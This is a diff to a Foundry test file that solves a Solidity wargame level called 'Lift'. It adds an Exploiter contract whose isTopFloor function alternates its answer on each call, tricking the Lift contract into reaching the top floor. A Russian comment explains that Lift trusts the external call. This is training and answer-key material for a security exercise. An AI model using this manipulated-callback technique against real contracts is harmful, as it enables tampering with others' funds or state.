@@ -3,7 +3,18 @@ pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
 import "src/07_Lift/Lift.sol";
+contract Exploiter is House {
+    bool returnValue = true;  // Начинаем с true
 
+    function attack(Lift target) external {
+        target.goToFloor(1);
+    }
+    function isTopFloor(uint256) external returns (bool) {
+        returnValue = !returnValue;
+        return returnValue;
+    }
+}
+// контракт Lift доверяет внешнему вызову, а выводом функции isTopFloor можно манипулировать
 // forge test --match-contract LiftTest
 contract LiftTest is BaseTest {
     Lift instance;
@@ -16,8 +27,8 @@ contract LiftTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        Exploiter exploiter = new Exploiter();
+        exploiter.attack(instance);
         checkSuccess();
     }
 
